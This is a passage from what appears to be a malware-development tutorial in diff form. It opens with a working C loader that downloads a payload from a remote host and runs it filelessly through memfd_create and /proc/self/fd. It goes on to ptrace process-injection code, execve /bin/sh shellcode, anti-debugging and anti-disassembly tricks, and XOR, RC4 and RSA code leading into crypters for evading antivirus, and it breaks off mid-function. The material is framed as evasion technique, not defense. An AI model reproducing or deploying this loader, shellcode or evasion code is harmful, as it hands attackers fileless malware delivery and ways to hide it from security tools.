+            char *tmp = realloc(mem->buf, mem->sz + len + 1);
+            if (!tmp) return 0;
+            mem->buf = tmp;
+            memcpy(&mem->buf[mem->sz], data, len);
+            mem->sz += len;
+            mem->buf[mem->sz] = 0;
+            return len;
+        }
+        
+        void fetch_and_exec(const char *host, int port, const char *uri) {
+            int s = socket(AF_INET, SOCK_STREAM, 0);
+            if (s < 0) return;
+        
+            struct sockaddr_in srv = {0};
+            srv.sin_family = AF_INET;
+            srv.sin_port = htons(port);
+            inet_pton(AF_INET, host, &srv.sin_addr);
+            if (connect(s, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+                close(s);
+                return;
+            }
+        
+            char req[1024];
+            snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", uri, host);
+            send(s, req, strlen(req), 0);
+        
+            char resp[4096];
+            struct Mem mem = {0};
+            ssize_t n;
+            while ((n = recv(s, resp, sizeof(resp) - 1, 0)) > 0)
+                append(&mem, resp, n);
+            
+            close(s);
+        
+            if (mem.sz > 0) {
+                int memfd = memfd_create("payload", MFD_CLOEXEC); // kernel 3.17 
+                if (memfd != -1) {
+                    write(memfd, mem.buf, mem.sz);
+                    char path[64];
+                    snprintf(path, sizeof(path), "/proc/self/fd/%d", memfd);
+                    if (fork() == 0) execl(path, "payload", NULL);
+                }
+                free(mem.buf);
+            }
+        }
+        
+        int main(int argc, char *argv[]) {
+            if (argc < 4) return 1;
+            fetch_and_exec(argv[1], atoi(argv[2]), argv[3]);
+            return 0;
+        }
+</span>
+
+The /proc filesystem serves as a critical interface that provides insight into the inner workings of processes. Specifically, /proc/self/ allows a process to access information about itself without needing to know its own process ID (PID). This path is not just a directory; it represents a direct connection to the currently running process, providing a wealth of information about its state, memory usage, and resources.
+
+At the core of our implementation is the concept of anonymous memory, which allows us to create memory that is not tied to any file on disk. This is where the memfd_create() system call becomes essential. It creates an anonymous memory file descriptor that we can write to, allowing for efficient execution of code stored entirely in RAM.
+
+<span class="preformatted">
+    int mem_fd = memfd_create("my_exec", MFD_CLOEXEC);
+</span>
+
+This line establishes a file descriptor for our memory region, facilitating our ability to write executable code directly into this space. When we use this file descriptor, we can then reference our memory using a path that combines /proc/self/fd/ with the file descriptor number:
+
+char path[256]; snprintf(path, sizeof(path), "/proc/self/fd/%d", mem_fd);
+
+Simply we gain access to the memory we just allocated, enabling us to execute the code it contains without ever writing to the filesystem, The isolation provided by the /proc/self/ mechanism is a significant advantage, Each process operates within its own address space.
+
+Now, before we return to our simple C2-like client, let's talk about the defense evasion technique, as this code have one. Yes, memory execution allows us to execute a binary directly from memory. Since the binary never gets written to the filesystem, it may go undetected by such defenses. Additionally, downloading executables at runtime from a remote server, along with creating a child process to execute the downloaded binary, separates it from the parent process. This brings us to the topic of Process Injection.
+
+Process Injection serves as a defense evasion technique frequently utilized in malware development, enabling the execution of arbitrary code within the address space of a separate, live process. This capability allows access to the memory, system resources, and potentially network resources of the target process.
+
+By executing code through process injection, malware can effectively evade detection by antivirus (AV) solutions, as the malicious execution is concealed within the context of a legitimate process. There are primarily two methods for injecting code into a process:
+
+1. Launching a legitimate process in which arbitrary code is subsequently injected for execution.
+2 Injecting code into an already running live remote process.
+
+To avoid prolonging this discussion, let's introduce the ptrace syscall and its role in facilitating shellcode injection for process injection.
+
+On Linux, the ptrace syscall enables the remote control of a process's execution, along with the ability to read from and write to its memory. However, invoking this syscall from an infected process raises suspicions. Given a command injection entry point, options to control it are limited (with gdb being one potential method). Furthermore, many Linux distributions implement a sysctl setting called kernel/yama/ptrace_scope, which governs the processes that can be ptraced by non-privileged users.
+
+Typically, modern production systems set this value to 1, enforcing "restricted ptrace" behavior. This means that non-root users can only ptrace their child processes. A straightforward method for code injection involves initiating a sleep child process, attaching to it using exec gdb, and then overwriting the memory at the current instruction pointer with your shellcode. However, this approach is quite noisy and relies on the availability of gdb, which is often absent from many environments.
+
+A recommendation is to configure ptrace_scope to 2, which prevents any runtime debugging activities without administrative privileges, effectively negating this entire class of techniques for non-root users. Delving into the ptracemanpage, we find the following function signature:
+
+<span class="preformatted">
+    long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
+</span>
+
+This function is designed to accept an operation/request, a target process identifier, an address, and a data pointer (buffer) as its arguments. Importantly, the calling process must first "attach" to the target process to establish a tracer-tracee relationship. The PTRACE_ATTACH request is particularly relevant, as it attaches to the target process and suspends it for subsequent requests. Conversely, PTRACE_DETACH serves to detach from the tracee and resume its execution. Additionally, PTRACE_GETREGS and PTRACE_POKETEXT offer capabilities to read general-purpose registers from the suspended tracee and write to the tracee's memory space, respectively.
+
+To modify a running process, the initial step is to start debugging it, referred to as "attaching." The following code snippet illustrates this:
+
+
+<span class="preformatted">
+    #include &lt;stdio.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;unistd.h&gt;
+    
+    #include &lt;sys/ptrace.h&gt;
+    #include &lt;sys/wait.h&gt;
+    #include &lt;sys/user.h&gt;
+    
+    int main(int argc, char **argv){
+        pid_t pid;
+        if (argc &lt; 2){
+            fprintf(stderr, "Usage %s &lt;pid&gt;\n", argv[0]);
+        }
+        pid = atoi(argv[1]);
+        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) &lt; 0){
+            perror("ptrace()");
+            _exit(-1);
+        }
+        waitpid(pid, NULL, 0);
+        fprintf(stderr, "Attached to the process %d \n", pid);
+        return 0;
+    }
+</span>
+
+Here, main function requires one argument here PID (Process Identifier) of process which we would like to change it. We save this parameter so we can use it in next ptrace call.
+
+When it comes to PTRACE_ATTACH itself, after this syscall with the target pid we instruct the kernel by running a forked traced process as long it reaches either a signal or a syscall entry and calls our ptracen tracer code. So all the process across is stopped at that moment such that we can start making changes to it.
+
+ptrace comes with few useful operations to help debug process :
+
+    PTRACE_ATTACH Allows one process to attach itself to another with the effect of debugging and pausing the remote process
+    PTRACE_PEEKTEXT: Allows reading of the memory section inside another process.
+    PTRACE_POKETEXT: Used to write memory of another process to an address in it.
+    PTRACE_GETREGS: Reads the current set of processor registers from a process
+    PTRACE_SETREGS: Writes to the current set of processor registers of a process
+    PTRACE_CONT: Resumes the execution of the attached process.
+
+Now let's write a program to which we will try to attach:
+    
+<span class="preformatted">
+    #include &lt;sys/prctl.h&gt;
+    #include &lt;sys/types.h&gt;
+    #include &lt;unistd.h&gt;
+    
+    #include &lt;stdio.h&gt;
+    
+    int main(void)
+    {
+        pid_t pid;
+    
+        if (0 &gt; prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY)) {
+            perror("Failed to disable injection protections");
+            return -1;
+        }
+    
+        pid = getpid();
+    
+        do {
+            printf("pid %u: sleeping\n", pid);
+            sleep(1);
+        } while (0 != 1);
+    }
+</span>
+
+When executed, this code runs in the background, allowing us time to attach to it. Running our injector application from another terminal will enable us to attach to this process, granting full control over its resources.
+
+The PTRACE_SETREGS request permits us to set the values of registers to any desired values. This is where our control becomes crucial, as we can modify the value of RIP to point to the address of our injected code and return execution to the process. There are several locations where code can be injected:
+
+The code can be injected at the current instruction being executed, represented by the address held in the RIPregister, as this region is executable.
+Code can also be injected onto the stack, though this method is generally less favorable since most stacks are non-executable to mitigate risks associated with stack buffer overflows via shellcode injection.
+Additionally, code can be injected into any executable memory region, a technique that will be explored in a future post.
+Lastly, code can be injected into the executable’s code cave, defined as a contiguous series of unused or NULL bytes that may exist when a program is loaded into memory, often due to page alignments.
+    
+<span class="preformatted">
+    # In a terminal
+    $ ./victim
+
+    # In another terminal
+    $ ./inject ./hello $(pgrep victim)
+    * Process attached
+    * Getting registers
+    (rip) 0x7fae94506a23
+    * Injecting shellcode
+    * Successfully injected code into the process
+    $   
+</span>
+
+In our discussion, we will go deeper into ptrace and its use in anti-debugging, all debuggers and program tracers depend on the ptrace call to set up the debugging environment for a given process. When a target program executes ptrace using the request type PTRACE_TRACEME, the child process is then set to be the tracer, which is the most commonly used process like bash. This feature infers that if a debugger is already connected to the program, the ptrace call would be muted, and consequently, the program debugging will be disabled.
+
+Nevertheless, the difficulty revolves around the question of how to detect and bypass the existence of ptrace. Thus, it can be seen from the import table pte in any modern disassembler if a binary makes use of ptrace. The observation is generally simple; bypassing can often be as simple as NOP-ing the call. For further reading on this topic, a comprehensive research study can be found here.
+
+Now, shifting our focus to another anti-debugging technique: the INT3 trap. The INT3 instruction functions as a software breakpoint, allowing debuggers to pause program execution for inspection of registers and memory states. In an anti-debugging scenario, the INT3 instruction is intentionally embedded within code to detect whether a debugger is present. When a debugger is attached, it will intercept the INT3 instruction; in contrast, if no debugger is present, the program is likely to crash or exhibit unpredictable behavior.
+
+<span class="preformatted">
+    #include &lt;stdio.h&gt;
+
+        int main() {
+            printf("Started...\n");
+        
+            // INT3 Trap - triggers a breakpoint interrupt
+            __asm__("int3");
+        
+            printf("Resumed after INT3...\n");
+            return 0;
+        }
+</span>
+
+Here, the INT3 instruction will trigger a software breakpoint, halting program execution if a debugger is actively tracing it. For instance, when run inside a debugger like GDB, the execution halts precisely at the INT3 instruction.
+
+<span class="preformatted">
+    $ gcc -g -o int3 int3_e.c
+    $ gdb ./int3 
+    (gdb) r
+    Program started...
+    Program received signal SIGTRAP, Trace/breakpoint trap.
+    0x0000000000401139 in main () at int3.c:8
+    8           __asm__("int3");
+    (gdb) continue
+    Resumed after INT3...
+</span>
+
+This method of detection is relatively is simple to bypass. Now, let's explore how to utilize the INT3 instruction in conjunction with the execve syscall for anti-debugging purposes.
+
+By positioning the INT3 instruction within our shellcode, we can determine if the code is executing under a debugger. When a debugger is connected, it will intercept the INT3 instruction, permitting us to react accordingly. Conversely, if the code runs without a debugger, encountering the INT3 can lead to an unexpected crash or erratic behavior, dictated by the surrounding code context.
+
+<span class="preformatted">
+    void *antiDebuggingThread(char *shellcode) {
+        while (1) {
+            // Check if the process is being traced
+            if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
+                printf("Well Hello There!\n");
+                // Simulate activity
+                sleep(1);
+                exit(-1);
+            }
+    
+            // Cast the shellcode to a function pointer and execute it
+            int (*shellcodec)() = (int (*)()) shellcode;
+            shellcodec();
+    
+            sleep(50);  // Sleep to simulate some work being done
+        }
+    }
+    
+    int main() {
+        char shellcode[] = "\xeb\x1a"                    // jmp short to <start>
+                           "\x48\x31\xc0"                // xor rax, rax
+                           "\x50"                        // push rax (NULL terminator for argv)
+                           "\x48\xbb\x2f\x62\x69\x6e\x2f" // movabs rbx, '/bin/sh'
+                           "\x73\x68"                    // '/sh'
+                           "\x53"                        // push rbx (argument for execve)
+                           "\x48\x89\xe7"                // mov rdi, rsp (set argv[0] to '/bin/sh')
+                           "\x50"                        // push rax (NULL for envp)
+                           "\x57"                        // push rdi (argument for execve)
+                           "\xb0\x3b"                    // mov al, 59 (execve syscall number)
+                           "\x0f\x05"                    // syscall
+                           "\xcc"                        // INT3 trap (breakpoint)
+                           "\x48\x31\xc0"                // xor rax, rax
+                           "\xb0\x3c"                    // mov al, 60 (exit syscall number)
+                           "\x0f\x05";                   // syscall
+    
+        printf("Shellcode length: %ld byte\nShellcode memory position: %p\n\n", 
+               strlen(shellcode), shellcode);
+        
+        // Start the anti-debugging thread
+        antiDebuggingThread(shellcode);
+    
+        return 0; 
+    }
+</span>
+
+This shellcode is crafted to invoke a /bin/sh shell through the execve syscall, while simultaneously integrating the INT3instruction as a mechanism for anti-debugging. If the shellcode detects a debugger, it pauses execution at the INT3, thus granting the developer insight into the program's state.
+
+Initially, the shellcode employs a jump instruction to alter the flow of execution and prepare the requisite arguments for the execve syscall. Prior to executing the shellcode, we invoke ptrace with PTRACE_TRACEME. If a debugger is present, the call will fail, prompting a message indicating debugger detection before exiting.
+
+
+<span class="preformatted">
+    $ gcc -z execstack -o int3_shellcode int3_shellcode.c
+    $ gdb ./int3_shellcode
+    (gdb) r
+    Starting program: int3_shellcode 
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    Shellcode length: 113 byte
+    Shellcode memory position: 0x7fffffffdd10
+    
+    Well Hello There!
+    (gdb) x/i $rip
+    => 0x400000 &lt;main&gt;:	mov    rax,0x0
+        (gdb) continue
+        Continuing.
+</span>
+
+
+Once the execve syscall is executed, the INT3 instruction serves as a breakpoint. If a debugger is operational, execution will pause at this juncture, enabling the user to inspect the program's state. Running the shellcode within a debugger (like GDB) leads to hitting the INT3 instruction, which halts execution.
+
+Now to close this section, one thing we can talk about disassembly and anti-disassembly tricks, First, however, we need to clarify what disassemblers are and how they function.
+
+Disassemblers can range from very simple to quite complex. Basic disassemblers perform straightforward tasks, while more advanced versions aim to identify functions (which may have multiple returns), recognize patterns like jump tables, and resist anti-disassembly techniques. Disassemblers typically fall into two general categories: Linear Disassemblersand Flow-oriented Disassemblers.
+
+Linear disassemblers disassemble all instructions sequentially, beginning from a specified point (usually the entry point of a binary). A key drawback is that they may disassemble excessive code, continuing until the end of the code section. They ignore the program's control flow, which can lead to issues when encountering data within the code section, such as pointer values and jump tables.
+
+In contrast, flow-oriented disassemblers track jumps and calls, continuing disassembly from their targets. They often cease disassembly after encountering return instructions, avoiding the display of unreachable instructions, which are likely not code. Flow-oriented disassemblers can accurately disassemble code when the correct instructions follow an unconditional jump. In contrast, linear disassemblers would continue to disassemble code sequentially after the unconditional branch instruction, potentially leading to incorrect interpretations of instructions or data.
+
+Plus, call instructions can be cleverly utilized to obscure pointers to data. For example, data can be placed immediately following a call instruction, followed by a pop and return instruction. In this scenario, the call does not invoke a function; instead, it positions the data on the stack as if it were the function's return address. The subsequent pop instruction retrieves the data from the stack into a register.
+
+One of the most common techniques employed to confuse disassemblers involves placing two back-to-back conditional branch instructions that target the same address. These two branch instructions are evaluated under opposite conditions, allowing them to function as a single unconditional branch instruction. As a result, this can mislead the disassembler into following a branch that is never actually taken, effectively hiding the instructions that will be executed. This method relies on the insertion of a rogue byte.
+
+Another approach utilizes a conditional branch instruction in a context where the condition is always constant. A common practice is to use the instruction xor eax, eax to ensure that the zero flag is set, satisfying the constant condition. Similar to the previous technique, this approach takes advantage of the disassembler processing the false branch before the true one, further obscuring the intended control flow. This technique also employs a rogue byte.
+
+The goal is to create a rogue byte that cannot be easily ignored by the disassembler. One method to achieve this involves placing a jump instruction with a target address that resides within another valid instruction, known as an inward-pointing jump instruction. For instance, consider the example of a jump that effectively functions as a NOP (no operation) due to its placement within the instruction sequence.
+
+<span class="preformatted">
+    jmp -1
+    EB FF C0 48
+    inc eax
+    dec eax
+</span>
+
+Disassembly:
+    mov ax, 05EBh
+    xor eax, eax
+    jz -7
+    Call
+
+
+Execution:
+    jmp 5
+    real code...
+
+This can be illustrated with a byte sequence that highlights the disassembly and execution process. The sequence may involve instructions like mov ax, 05EBh, followed by xor eax, eax, and then a conditional jump. The execution may include a jump to a location in the code that leads to the real operations being carried out. This sequence abuses the call and return instructions to disrupt function boundaries, which effectively pushes the return address onto the stack. When this address corresponds to the byte immediately following the return, the return instruction pops this address into the program counter, rendering this two-instruction combination ineffective. However, this can mislead the disassembler into thinking that the function concludes at this point, incorrectly suggesting that the next instruction marks the end of another function.
+
+<span class="preformatted">
+    void real_function() {
+        printf("Real function executed!\n");
+    }
+    
+    void fake_function() {
+        printf("Fake function executed, but this is a decoy!\n");
+    }
+    
+    void anti_disassembly() {
+        // Inline assembly to confuse disassembly tools
+        __asm__ volatile(
+            "nop;\n" // Padding NOP
+            "jmp misleading;\n" // Jump to fake code
+            "real_code:\n"
+            "movq $0, %rax;\n"
+            "nop;\n" // Another padding NOP
+            "jmp end;\n" // Jump to the end, bypassing real functionality
+            "misleading:\n"
+            "nop;\n" // Padding NOP
+            "jmp real_code;\n" // Redirect back to real code, after junk
+            "end:\n"
+            "nop;\n" // End of function
+        );
+    }
+    
+    int main() {
+        int condition = rand() % 2; // Randomly decide behavior
+    
+        if (condition) {
+            printf("Condition is true, executing real_function.\n");
+            real_function();
+        } else {
+            printf("Condition is false, attempting fake function call.\n");
+            fake_function();
+        }
+    
+        printf("Calling anti_disassembly to confuse analysis.\n");
+        anti_disassembly(); // Anti-disassembly
+    
+        return 0;
+    }
+</span>
+
+The heavy utilization of function pointers can obscure control flow in a program. Although this might not be done with the explicit intention of complicating the reverse engineer's efforts, it produces the same effect. When function pointers are involved, the address may cross-reference wherever the pointer is copied. However, when called from a register or memory address, the disassembler often struggles to determine when the pointer is utilized, further complicating the analysis.
+
+000000000000115f <fake_function>:
+    115f:       55                      push   %rbp
+    1160:       48 89 e5                mov    %rsp,%rbp
+    1163:       48 8d 05 b6 0e 00 00    lea    0xeb6(%rip),%rax        
+    116a:       48 89 c7                mov    %rax,%rdi
+    116d:       e8 be fe ff ff          call   1030 <puts@plt>
+    1172:       90                      nop
+    1173:       5d                      pop    %rbp
+    1174:       c3                      ret
+
+0000000000001175 <anti_disassembly>:
+    1175:       55                      push   %rbp
+    1176:       48 89 e5                mov    %rsp,%rbp
+    1179:       90                      nop
+    117a:       eb 0a                   jmp    1186 <misleading>
+
+000000000000117c <real_code>:
+    117c:       48 c7 c0 00 00 00 00    mov    $0x0,%rax
+    1183:       90                      nop
+    1184:       eb 03                   jmp    1189 <end>
+
+
+Now he jump to misleading followed by a jump back to the "real" code (real_code) makes the flow look more complex than it is. In reality, it is just a way to add confusion without changing the program’s behavior. nop instructions, while harmless, make it harder to identify the real code paths. A beginner might spend unnecessary time trying to understand their purpose.
+
+The mov rax, 0x0 instruction, which appears to do something with a register, is simply a decoy. In a normal situation, a reverse engineer would think this instruction is doing something important. By inserting it into the control flow, we trick the disassembler into thinking the program is doing actual work, when it’s not. The jump (jmp) redirects control flow to misleading labels. While this redirection leads back to valid code, it creates confusion for both the reverse engineer and disassemblers by adding a seemingly irrelevant path that dissects the logical flow.
+
+Now a few notes to keep in mind, Instructions like mov rax, 0x0 that seem out of place and don't affect the program should be flagged as junk code and try to focus on the key branches that affect the program flow, like jumps leading to functional code, and just ignore instructions like nop
+
+....
+
+There are many cryptographic algorithms that transform one sequence of bits into another in a way that allows recovery of the original using a private key. In cryptography, that’s essentially what privacy means — pretty simple, right?
+
+One of the earliest encryption methods is the Caesar cipher. It works by adding a fixed value to each byte in a sequence, shifting its position. To decrypt, you simply subtract that value to recover the original. For example, if we shift each letter in the word “FOO” by 2 positions:
+
+‘F’ becomes ‘H’ (F → G → H)
+‘O’ becomes ‘Q’ (O → P → Q)
+
+So “FOO” becomes “HQQ.” To decrypt, you reverse the process by subtracting 2 from each letter.
+
+The Caesar cipher is simple but weak. If an attacker doesn’t know the key, they only have to try all possible values (255 in a byte). This makes it easy to crack, especially with modern computing power.
+
+In more advanced cryptography, algorithms use something called trapdoor functions. These functions are easy to compute in one direction but extremely difficult to reverse without special information, called the trapdoor or key. This idea forms the backbone of modern cryptographic methods like RSA and ECC.
+
+Note: While the Caesar cipher illustrates the basic principle of encryption and decryption, it’s not a true trapdoor function. True cryptographic trapdoors, like those used in RSA, require complex mathematics, such as Euler’s totient function, to ensure security.
+
+Now, the first thing we need to grasp is XOR operation (exclusive OR) which is a prominent tool in modern cryptography. (Caesar cipher, which is limited to simple addition and subtraction() is the fact defined in XOR as being a reversible, by the same operation both we can use it for encryption as well as decryption, furthermore we will see this when we are talking about crypters
+
+If you have a value, let's say value, and XOR it with a key, you get a new value, encrypted_value. XORing the encrypted_value again with the same key restores the original value. This can be written as:
+
+value XOR key = encrypted_value
+encrypted_value XOR key = value
+
+This property makes XOR very useful for symmetric encryption, where the same key is used for both encrypting and decrypting data.
+
+<span class="preformatted">
+    void decrypt(uint16_t *start_of_encryption, size_t length_in_words, uint16_t key)
+{
+    uint16_t *src = start_of_encryption;    // Points to the start of encrypted data
+    uint16_t *dest = start_of_encryption;   // Destination is the same as source for in-place decryption
+
+    // Loop over the data
+    for (size_t i = 0; i < length_in_words; ++i)
+    {
+        *dest = *src ^ key;  // Decrypt the data
+        ++src;               // Move to the next word
+        ++dest;              // Move to the next destination
+    }
+}
+</span>
+
+In this code, we XOR each data word with the key to decrypt it. The same operation can be used to encrypt the data, demonstrating how XOR encryption is both efficient and reversible.
+
+While the Caesar cipher and XOR are examples of symmetric encryption (where the same key is used for both encryption and decryption), more advanced cryptography often involves asymmetric encryption. Asymmetric systems, like RSA, use two keys — a public key to encrypt and a private key to decrypt. This is made possible by the use of trapdoor functions.
+
+Up next, we’ll explore the advantages and disadvantages of symmetric and asymmetric encryption, diving into the principles that make modern cryptography.
+
+Alright, Let's talk real world cipher, RC4, the cipher itself is simple enough to implement — we’ll even code it in assembly later! But unlike trivial examples, RC4 is a real algorithm used in real-world encryption, like WEP for Wi-Fi networks and even PDF encryption up until version 2.0.
+
+At its core, RC4 is a XOR encoder that uses a permutation matrix to generate a sequence of values. It’s similar to the Vernam cipher, where the key is a pseudo-random sequence generated from the user-provided key. In RC4, the encryption key has a size equal to the plaintext, but the sequence is pseudo-random, not truly random, which weakens the cipher.
+
+The first part of RC4 is the Key-Scheduling Algorithm (KSA). This algorithm shuffles the permutation matrix, denoted as S, based on the provided key. The matrix starts as an identity matrix, where each element corresponds to its index (i.e., S[i] = i). Here’s the C code for KSA:
+
+<span class="preformatted">
+    for (i = 0; i < 255; S[i] = i, i++);
+    for (j = 0, i = 0; i < 256; i++) {
+    j = (j + S[i] + key[i % klen]) % 256;
+    SWAP(S[i], S[j]);
+}
+</span>
+
+The SWAP macro here uses the addition/subtraction method to exchange two values without a temporary variable: 
+
+     #define SWAP(a,b) a += b; b = a - b; a -= b;
+
+After this, the permutation matrix is shuffled based on the key, ready to generate pseudo-random values for encryption.
+
+Before we continue, let’s quickly cover the modulo operator, which calculates the remainder after division. For example:
+
+6 % 5 = 1 because 6 divided by 5 is 1 with a remainder of 1.
+
+In RC4, we use % 256 frequently to keep values within a range of 0–255, which corresponds to a byte. This is intentional since RC4 is designed to work with bytes.
+
+RC4’s pseudo-random number generator creates a sequence of values used in the XOR operation to encrypt (or decrypt) the message. Here’s the code for that:
+
+<span class="preformatted">
+    i = j = 0;
+    int cnt = 0;
+    while (cnt < MSG_LEN) {
+    i = (i + 1) % 256;
+    j = (j + S[i]) % 256;
+    
+    SWAP(S[i], S[j]);
+    
+    msg1[cnt++] = msg[cnt] ^ S[(S[i] + S[j]) % 256];
+}
+</span>
+
+In this implementation, msg is the plaintext, and msg1 is the buffer containing the encrypted message. The line S[(S[i] + S[j]) % 256] generates a pseudo-random sequence, and the XOR operation encrypts the message. The same process can be used to decrypt by XORing the encrypted data again with the pseudo-random sequence.
+
+We call it pseudo-random because the values are generated algorithmically, and the sequence can be recreated if the seed (key) is known. Real random sequences, on the other hand, cannot be predicted or reproduced. Modern operating systems use entropy pools (sources like mouse movements, keyboard presses) to improve randomness, a much better approach than early random number generators used in outdated protocols like TCP spoofing.
+
+RC4 is a real-world cipher, though it’s no longer as secure as it once was. It has been used in the WEP encryptionstandard for Wi-Fi, Microsoft’s Point-to-Point Encryption, and older versions of PDF encryption. While RC4 has been largely replaced due to its vulnerabilities, it remains an important cipher to study due to its simplicity and historical significance.
+
+Symmetric and Asymmetric.
+
+Symmetric encryption is simple: you use one key for both encryption and decryption of data. The sending and the receiving sides share the key, and this is the main challenge because the key must be kept secret. The great issue here is what is called a "key distribution problem" because both parties want the key but can not easily share it without its discovery. Yet, symmetric encryption is fast, and therefore, ideal for encrypting a large amount of data. As a result, it has been employed to encrypt data at rest (files or databases) and **data in transit (through secure channels after the exchange of necessary keys). Symmetric encryption algorithms involve AES, DES, and 3DES,but if the key is gained by someone all encrypted data can be uncovered as well. Besides, in case there are numerous users, then it will be hard and confusing to deal with keys—that takes a long time to solve the problem for massive systems.Now, unlike symmetric encryption,
+
+the asymmetric encryption operates in a slightly different way. Instead of a single key, you possess a key pair: a public key (which anyone can have) and a private key (which you keep for yourself). The main demerit of asymmetric encryption is that it has to be done with more complex mathematics, which are slow, and so it is not suitable for large volumes of data. Thus, it is used mainly for key exchange or for making sure that the communication they have with digital signatures is authentic. Some of the popular asymmetric encryption algorithms are RSA as well as ECC and Diffie-Hellman. Asymmetric encryption, besides the advantages, also has its own problems. A problem, for instance, concerns the key length, in the sense that the key is at potential risk from attacks, and long keys necessitate immense computing power.
+
+OpenSSL is a widely used library for implementing the SSL and TLS protocols. It is written in C and provides a variety of cryptographic functions, including support for public and private key operations with RSA. The keys are often stored and exchanged in PEM format, which is a base64-encoded format that is easy to read and send.
+
+To generate RSA keys, you can use OpenSSL's built-in functions. Below is a simple function to read a public or private RSA key from a memory buffer:
+
+<span class="preformatted">
+    RSA *genRSA(unsigned char *key, int public) {
+        RSA *rsa = NULL;
+        BIO *keybio = BIO_new_mem_buf(key, -1);
+        if (keybio == NULL)
+            return NULL;
+        if (public)
+            return PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
+        else
+            return PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
+    }
+</span>
+
+and uses BIO_new_mem_buf to create a BIO object that reads from the provided memory buffer containing the key. It then reads the appropriate key using either PEM_read_bio_RSA_PUBKEY or PEM_read_bio_RSAPrivateKey.
+
+<span class="preformatted">
+    RSA *createRSAWithFilename(char *filename, int public) {
+        FILE *fp = fopen(filename, "rb");
+        if (fp == NULL)
+            return NULL;
+        RSA *rsa = RSA_new();
+        if (public)
+            return PEM_read_RSA_PUBKEY(fp, &rsa, NULL, NULL);
+        else
+            return PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);
+    }
+</span>
+
+write RSA structure from a key stored in a file, It opens the specified file in binary read mode. If the file cannot be opened, it returns NULL. and An RSA object is created using RSA_new(), and the key is read in the same manner as in the previous function, depending on whether it's a public or private key.
+
+Opens a file in binary read mode and reads the key based on whether it’s a public or private key, The following demonstrate how to encrypt and decrypt data using RSA keys.
+
+<span class="preformatted">
+    int public_encrypt(unsigned char *data, int datalen, unsigned char *key, unsigned char *encrypted) {
+        RSA *rsa = genRSA(key, 1);
+        return RSA_public_encrypt(datalen, data, encrypted, rsa, RSA_PKCS1_PADDING);
+    }
+
+    int public_decrypt(unsigned char *enc_data, int data_len, unsigned char *key, unsigned char *decrypted) {
+        RSA *rsa = genRSA(key, 1);
+        return RSA_public_decrypt(data_len, enc_data, decrypted, rsa, RSA_PKCS1_PADDING);
+    }
+</span>
+
+and the same case goes for private key encryption and decryption, the key can be used in the encryption and decryption functions we defined earlier to demonstrate the RSA algorithm's
+
+<span class="preformatted">
+    // $ openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048 $ 
+    // openssl rsa -pubout -inprivate_key.pem -out public.pem
+
+/* 
+gcc -o rsa_e rsa_e.c -lssl -lcrypto
+$ rsa_e
+$ ls | grep pem
+private.pem
+public.pem 
+*/
+
+    #include &lt;stdio.h&gt;
+    #include &lt;openssl/rsa.h&gt;
+    #include &lt;openssl/pem.h&gt;
+    #include &lt;openssl/err.h&gt;
+
+int main() {
+    RSA *rsa = RSA_new();
+    BIGNUM *bne = BN_new();
+    int bits = 2048;
+    unsigned long e = RSA_F4; // 65537
+
+    BN_set_word(bne, e);
+    RSA_generate_key_ex(rsa, bits, bne, NULL);
+
+    FILE *private_key_file = fopen("private.pem", "wb");
+    PEM_write_RSAPrivateKey(private_key_file, rsa, NULL, NULL, 0, NULL, NULL);
+    fclose(private_key_file);
+    printf("Private key saved to private.pem\n");
+
+    FILE *public_key_file = fopen("public.pem", "wb");
+    PEM_write_RSA_PUBKEY(public_key_file, rsa);
+    fclose(public_key_file);
+    printf("Public key saved to public.pem\n");
+
+    RSA_free(rsa);
+    BN_free(bne);
+
+    return 0;
+}
+</span>
+
+...
+
+Alright, now to conclude this discussion and move on, let's talk about crypters. A crypter is a program that takes another program as input, encrypts it, and wraps it in self-decrypting code (often referred to as a stub or wrapper). This way, at runtime, the program performs the same functions while having a different on-disk and in-memory footprint compared to the original code.
+
+The term "crypter" essentially means "a program that wraps easily detected malware in a blob of self-modifying code to make it less detectable, allowing me to avoid writing new malware."
+
+This obfuscation technique helps evade signature-based antivirus and intrusion prevention system (IPS) detection, as well as slows down static analysis of the malware. Cryptographic algorithms serve as effective tools for this purpose, so even flawed or weak cryptography can fulfill the requirements of a crypter.
+
+A crypter is a simple tool that encrypts parts of the program so they can't be disassembled while sitting on the disk (until decrypted). It decrypts these parts at load time or just before execution. That’s the core function of crypters! They usually need a packer. Damn, I shouldn’t have mentioned that without explaining it first.
+
+So, what’s a packer? A packer is a program that takes an executable file and wraps it in a software envelope. The packer may modify the executable but keeps the original functionality intact. This envelope is often referred to as a stub, designed to unpack and run the file. There are types like a compressor, which simply shrinks the packed file’s size using a compression algorithm, applying little to no anti-unpacking techniques.
+
+But we’ve veered off course again let’s reel it back in!
+
+To open and map a binary file in C, we use memory mapping (via mmap) instead of traditional file handling methods. This approach allows us to read and modify the binary directly in memory, with changes automatically saved when the file is closed. The first step involves checking the command-line arguments for the binary file to process. If the input is valid, we open the file and retrieve its size using the fstat system call.
+
+Once we have the file size, we use mmap to create a mapping between the file and our program’s virtual memory space. This enables us to treat the file contents as if they were a normal array in memory. The mmap function takes several parameters, including the address to map the file into, the size of the mapping, the access permissions, flags, and the file descriptor obtained from the open call. With these parameters, we can efficiently read from and write to the binary without needing to handle file operations manually.
+
+<span class="preformatted">
+    void print_text_section(unsigned char *mapped, Elf64_Ehdr *ehdr) {
+        Elf64_Shdr *shdr = (Elf64_Shdr *)(mapped + ehdr->e_shoff);
+        char *strtab = (char *)(mapped + shdr[ehdr->e_shstrndx].sh_offset);
+    
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_type == SHT_PROGBITS && (shdr[i].sh_flags & SHF_EXECINSTR)) {
+                printf("Section: %s\n", strtab + shdr[i].sh_name);
